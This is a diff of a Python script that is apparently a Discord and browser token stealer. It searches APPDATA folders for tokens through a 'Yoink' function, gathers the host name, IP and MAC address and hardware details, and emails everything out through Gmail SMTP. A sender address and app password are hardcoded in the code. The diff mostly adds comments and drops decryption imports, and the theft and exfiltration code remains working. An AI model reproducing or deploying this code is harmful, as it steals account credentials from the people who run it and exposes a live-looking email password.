@@ -8,22 +8,14 @@ import socket
 import os
 import re
 from uuid import getnode as get_mac
-import base64
-import sqlite3
-import shutil
-import sys
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
 
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-# Your Gmail credentials
+# Email credentials
 SENDER_EMAIL = "ysflnt1@gmail.com"
-APP_PASSWORD = "ncwbnpuswsemmaxw"  # Your 16-character app password
-
-# Recipient email (you said send to yourself)
+APP_PASSWORD = "ncwbnpuswsemmaxw"  # Your Gmail app password here
 RECEIVER_EMAIL = "ysflnt1@gmail.com"
 
 def send_email_smtp(subject, message):
@@ -36,15 +28,13 @@ def send_email_smtp(subject, message):
 
     try:
         server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()  # Secure connection
+        server.starttls()
         server.login(SENDER_EMAIL, APP_PASSWORD)
         server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
         server.quit()
         print("Email sent successfully!")
     except Exception as e:
         print(f"Failed to send email: {e}")
-
-# ... your other code unchanged ...
 
 def scale(bytes, suffix="B"):
     defined = 1024
@@ -71,6 +61,7 @@ mac = get_mac()
 
 roaming = os.getenv('APPDATA')
 
+# Directories to search for Discord & browser tokens
 Directories = {
     'Discord': roaming + '\\Discord',
     'Discord Two': roaming + '\\discord',
@@ -103,12 +94,14 @@ def Yoink(Directory):
             continue
     return Tokens
 
+# Collect tokens
 all_tokens = []
 for name, path in Directories.items():
     if os.path.exists(path):
         tokens = Yoink(path)
         all_tokens.extend(tokens)
 
+# System info
 cpufreq = psutil.cpu_freq()
 svmem = psutil.virtual_memory()
 disk_io = psutil.disk_io_counters()
@@ -126,6 +119,7 @@ try:
 except:
     partition_usage = None
 
+# Format info
 collected_info = f"""
 Host: {host}
 Local IP: {localip}
